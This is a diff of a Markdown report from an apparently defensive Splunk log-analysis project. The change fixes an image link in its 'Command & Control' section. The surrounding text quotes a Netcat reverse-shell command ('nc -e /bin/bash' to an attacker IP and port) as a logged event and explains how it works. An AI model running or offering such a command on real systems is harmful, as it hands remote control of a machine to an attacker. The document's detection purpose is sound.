@@ -289,7 +289,7 @@ Event 10: This is a type of Nmap SYN Scan that uses the command "nmap -sS -p 1-6
 - Service Hardening: Disable unnecessary protocols and strengthen security settings on servers and network devices.
 
 # Command & Control
-![(Command&Control]
+![(Command&Control](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/fe195f85701c7c376d6abac465e0ec6ff75bee16/assets/c2-attacks.png)
 
 Event 1: The technique used is "Reverse Shell" by executing the command "nc -e /bin/bash 192.168.1.200 4444". This command uses Netcat to create a reverse shell, redirecting /bin/bash to the attacking host (192.168.1.200) on port 4444, allowing remote control of the compromised system.
 - Source IP: 192.168.1.100
